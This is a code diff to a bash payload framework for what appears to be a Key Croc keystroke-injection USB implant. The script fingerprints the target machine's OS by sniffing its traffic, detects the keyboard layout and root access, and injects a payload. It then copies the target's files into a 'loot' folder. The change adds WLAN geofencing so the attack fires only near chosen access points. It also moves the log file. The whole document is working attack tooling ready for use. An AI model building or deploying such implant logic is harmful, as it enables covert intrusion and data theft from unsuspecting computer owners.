@@ -4,6 +4,11 @@
 # configure detection (OS, layout and root) and payload
 ################################################################################
 
+# WLAN AP geofencing
+# set to 1 is active, 0 is deactivated
+# set the allowed / denied devices in the wlanFencing function
+doWlanFencing=0
+
 # OS detection
 # if the string is empty then script will try to determine the OS
 # if an OS ("Windows", "Linux" or "Mac") is set the detection will be skipped
@@ -77,11 +82,27 @@ rootAvailable=0
 ################################################################################
 
 function cleanStop() {
-    echo "$(date +"%T") : cleanup - resetting mass storage" >> /root/log.txt
+    echo "$(date +"%T") : cleanup - resetting mass storage" >> /root/udisk/keyos-log.txt
     ATTACKMODE OFF
-    echo "$(date +"%T") : cleanup - resetting $drive" >> /root/log.txt
-    /root/scripts/image-helper.sh prepare $imagePath/$drive 2>>/root/log.txt
-    echo "$(date +"%T") : cleanup - done" >> /root/log.txt
+    echo "$(date +"%T") : cleanup - resetting $drive" >> /root/udisk/keyos-log.txt
+    /root/scripts/image-helper.sh prepare $imagePath/$drive 2>>/root/udisk/keyos-log.txt
+    echo "$(date +"%T") : cleanup - done" >> /root/udisk/keyos-log.txt
+}
+
+function wlanFencing() {
+    echo "$(date +"%T") : WLAN AP geofencing ..." >> /root/udisk/keyos-log.txt
+    sleep 2
+    # adjust to your needs
+    # for detailed inforation about the cli syntax check the wlanFencing.py file
+    /root/scripts/wlanFencing.py -a "<SSID>"
+    if [ "$?" -eq "0" ]
+    then
+        echo "$(date +"%T") : WLAN AP geofencing - conditions met" >> /root/udisk/keyos-log.txt
+    else
+        echo "$(date +"%T") : WLAN AP geofencing failed - stopping" >> /root/udisk/keyos-log.txt
+        LED FAIL
+        exit 1
+    fi
 }
 
 function detectOS() {
@@ -111,12 +132,12 @@ function detectOS() {
         case $tmpOS in
 
             "Windows" | "Linux" | "Mac" | "Unknown")
-                #echo "$(date +"%T") : OS is Windows, Linux, Mac or Unknown" >> /root/log.txt
+                #echo "$(date +"%T") : OS is Windows, Linux, Mac or Unknown" >> /root/udisk/keyos-log.txt
                 os=$tmpOS
                 ;;
 
             *)
-                #echo "$(date +"%T") : no OS found" >> /root/log.txt
+                #echo "$(date +"%T") : no OS found" >> /root/udisk/keyos-log.txt
                 ;;
         esac
     }
@@ -127,28 +148,28 @@ function detectOS() {
         mkfifo $pipe_py
     fi
 
-    /root/scripts/analyze-pcap.py 2>>/root/log.txt &
+    /root/scripts/analyze-pcap.py 2>>/root/udisk/keyos-log.txt &
     ATTACKMODE RNDIS_ETHERNET
 
-    echo "$(date +"%T") : sniffing ..." >> /root/log.txt
+    echo "$(date +"%T") : sniffing ..." >> /root/udisk/keyos-log.txt
     readFifo
 
     # check if the OS could be identified
     if [[ ! -z $os ]]
     then
-        echo "$(date +"%T") : analyzing successful" >> /root/log.txt
+        echo "$(date +"%T") : analyzing successful" >> /root/udisk/keyos-log.txt
         echo -n "stop" > /root/pyrecv
     else
-        echo "$(date +"%T") : no packets found - retrying sniffing ..." >> /root/log.txt
+        echo "$(date +"%T") : no packets found - retrying sniffing ..." >> /root/udisk/keyos-log.txt
         ATTACKMODE ECM_ETHERNET
         readFifo
 
         if [[ ! -z $os ]]
         then
-            echo "$(date +"%T") : analyzing successful" >> /root/log.txt
+            echo "$(date +"%T") : analyzing successful" >> /root/udisk/keyos-log.txt
             echo -n "stop" > /root/pyrecv
         else
-            echo "$(date +"%T") : second analyzing try failed - stopping" >> /root/log.txt
+            echo "$(date +"%T") : second analyzing try failed - stopping" >> /root/udisk/keyos-log.txt
             echo -n "stop" > /root/pyrecv
             # storage is untouched --> exit is enough
             LED FAIL
@@ -160,12 +181,12 @@ function detectOS() {
 
     if echo $os | grep -q "Unknown"
     then
-        echo "$(date +"%T") : could not detect the OS - stopping" >> /root/log.txt
+        echo "$(date +"%T") : could not detect the OS - stopping" >> /root/udisk/keyos-log.txt
         # storage is untouched --> exit is enough
         LED FAIL
         exit 1
     else
-        echo "$(date +"%T") : detected OS: $os" >> /root/log.txt
+        echo "$(date +"%T") : detected OS: $os" >> /root/udisk/keyos-log.txt
     fi
 }
 
@@ -179,7 +200,7 @@ function mountDrive() {
     fi
 
     # mount the correct drive depending on the OS
-    echo "$(date +"%T") : mounting drive: $drive" >> /root/log.txt
+    echo "$(date +"%T") : mounting drive: $drive" >> /root/udisk/keyos-log.txt
     sed -i -r "s# file=[^[:space:]]+# file=$imagePath/$drive#g" /usr/local/croc/bin/ATTACKMODE
     ATTACKMODE HID STORAGE
     # reset device for mass storage (otherwise accessing the payload dir does not work anymore with a pin)
@@ -201,14 +222,14 @@ function detectLayout() {
     for lang in "${langs[@]}"
     do
         export DUCKY_LANG=$lang
-        echo "$(date +"%T") : trying language $DUCKY_LANG ..." >> /root/log.txt
+        echo "$(date +"%T") : trying language $DUCKY_LANG ..." >> /root/udisk/keyos-log.txt
         /root/udisk/library/keyboard.sh $os
-        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/log.txt
+        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
 
-        #ls -lah $mountPath >> /root/log.txt # DEBUG
+        #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
         if [ -f $mountPath/language.txt ]
         then
-            echo "$(date +"%T") : keyboard language is $DUCKY_LANG" >> /root/log.txt
+            echo "$(date +"%T") : keyboard language is $DUCKY_LANG" >> /root/udisk/keyos-log.txt
             umount $mountPath
             break
         fi
@@ -217,7 +238,7 @@ function detectLayout() {
         # last language try and no success --> abort
         if [[ "$lang" == "${langs[-1]}" ]]
         then
-            echo "$(date +"%T") : unknown keyboard language - stopping" >> /root/log.txt
+            echo "$(date +"%T") : unknown keyboard language - stopping" >> /root/udisk/keyos-log.txt
             cleanStop
             LED FAIL
             exit 1
@@ -227,17 +248,17 @@ function detectLayout() {
 
 
 function checkRoot() {
-    echo "$(date +"%T") : root check enabled" >> /root/log.txt
+    echo "$(date +"%T") : root check enabled" >> /root/udisk/keyos-log.txt
     # run root-check
     /root/udisk/library/root-check.sh $os
-    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/log.txt
-    #ls -lah $mountPath >> /root/log.txt # DEBUG
+    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
+    #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
     if [ -f $mountPath/root.txt ]
     then
-        echo "$(date +"%T") : root available" >> /root/log.txt
+        echo "$(date +"%T") : root available" >> /root/udisk/keyos-log.txt
         rootAvailable=1
     else
-        echo "$(date +"%T") : root not available" >> /root/log.txt
+        echo "$(date +"%T") : root not available" >> /root/udisk/keyos-log.txt
         rootAvailable=0
     fi
     umount $mountPath
@@ -256,7 +277,7 @@ function executePayload() {
     then
         if [ $rootAvailable -eq 0 ] && [ $needRoot -eq 1 ]
         then
-            echo "$(date +"%T") : stopping - reason: root not available" >> /root/log.txt
+            echo "$(date +"%T") : stopping - reason: root not available" >> /root/udisk/keyos-log.txt
             cleanStop
             LED FAIL
             exit 1
@@ -271,8 +292,8 @@ function executePayload() {
     # if done file is set wait until the file has appeared / maxTries is reached
     if [ ! -z $doneFile ]
     then
-        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/log.txt
-        #ls -lah $mountPath >> /root/log.txt # DEBUG
+        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
+        #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
         ls $mountPath | grep -q $doneFile
         foundFile=$?
         umount $mountPath
@@ -281,9 +302,9 @@ function executePayload() {
         iterations=0
         until [ "$foundFile" -eq "0" ]
         do
-            echo "$(date +"%T") : waiting for payload feedback - iteration $iterations" >> /root/log.txt
-            mount -r -o loop $imagePath/$drive $mountPath 2>>/root/log.txt
-            #ls -lah $mountPath >> /root/log.txt # DEBUG
+            echo "$(date +"%T") : waiting for payload feedback - iteration $iterations" >> /root/udisk/keyos-log.txt
+            mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
+            #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
             ls $mountPath | grep -q $doneFile
             foundFile=$?
             umount $mountPath
@@ -292,7 +313,7 @@ function executePayload() {
             # if so: stop and clean up (sth probably did not work)
             if (( iterations > maxTries ))
             then
-                echo "$(date +"%T") : stopping - reason: waited more than $maxTries seconds for feedback" >> /root/log.txt
+                echo "$(date +"%T") : stopping - reason: waited more than $maxTries seconds for feedback" >> /root/udisk/keyos-log.txt
                 cleanStop
                 LED FAIL
                 exit 1
@@ -303,14 +324,14 @@ function executePayload() {
         done
     fi
 
-    echo "$(date +"%T") : payload execution is done" >> /root/log.txt
+    echo "$(date +"%T") : payload execution is done" >> /root/udisk/keyos-log.txt
 }
 
 function saveFiles() {
-    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/log.txt
+    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
     newFolderName=$(date +%Y-%m-%d_%H%M%S)
     mkdir /root/udisk/loot/$newFolderName
-    cp $mountPath/$extractFiles /root/udisk/loot/$newFolderName 2>>/root/log.txt
+    cp $mountPath/$extractFiles /root/udisk/loot/$newFolderName 2>>/root/udisk/keyos-log.txt
     umount $mountPath
 }
 
@@ -321,8 +342,15 @@ function saveFiles() {
 
 ATTACKMODE OFF
 LED ATTACK
-cat /dev/null > /root/log.txt
-echo "$(date +"%T") : start" >> /root/log.txt
+cat /dev/null > /root/udisk/keyos-log.txt
+echo "$(date +"%T") : start" >> /root/udisk/keyos-log.txt
+
+# WLAN AP geofencing
+# wait until WLAN APs are in range / out of range
+if [ $doWlanFencing -eq 1 ]
+then
+    wlanFencing
+fi
 
 # OS detection
 # try to detect the OS if an OS is not set
@@ -338,7 +366,7 @@ mountDrive
 # use altcode mode if activated and OS is Windows (detected or set)
 if [ $winForceUS -eq 1 ] && [ $os = "Windows" ]
 then
-    echo "$(date +"%T") : altcode mode - will force to use the 'us' layout" >> /root/log.txt
+    echo "$(date +"%T") : altcode mode - will force to use the 'us' layout" >> /root/udisk/keyos-log.txt
     /root/udisk/library/keyboard-altcode.sh $os
 else
     # take a look at the langs array
@@ -346,14 +374,14 @@ else
     # otherwise use set single language or the Key Croc default ("us")
     if [ ${#langs[@]} -eq 1 ]
     then
-        echo "$(date +"%T") : single layout set to ${langs[0]}" >> /root/log.txt
+        echo "$(date +"%T") : single layout set to ${langs[0]}" >> /root/udisk/keyos-log.txt
         export DUCKY_LANG=${langs[0]}
     elif [ ${#langs[@]} -gt 1 ]
     then
-        echo "$(date +"%T") : layout detection ..." >> /root/log.txt
+        echo "$(date +"%T") : layout detection ..." >> /root/udisk/keyos-log.txt
         detectLayout
     else
-        echo "$(date +"%T") : no layout set, using default" >> /root/log.txt
+        echo "$(date +"%T") : no layout set, using default" >> /root/udisk/keyos-log.txt
     fi
 fi
 
@@ -364,7 +392,7 @@ then
 fi
 
 # payload execution
-echo "$(date +"%T") : executing payload" >> /root/log.txt
+echo "$(date +"%T") : executing payload" >> /root/udisk/keyos-log.txt
 executePayload
 
 # file saving
@@ -372,12 +400,12 @@ if ! test -z "$extractFiles"
 then
     # try to backup copied places data (from victim) if there are any
     # in a newly created folder (y-m-d_hms)
-    echo "$(date +"%T") : extracting files from mass storage" >> /root/log.txt
+    echo "$(date +"%T") : extracting files from mass storage" >> /root/udisk/keyos-log.txt
     saveFiles
     cleanStop
 else
     cleanStop
 fi
 
-echo "$(date +"%T") : execution and clearing done" >> /root/log.txt
+echo "$(date +"%T") : execution and clearing done" >> /root/udisk/keyos-log.txt
 LED FINISH
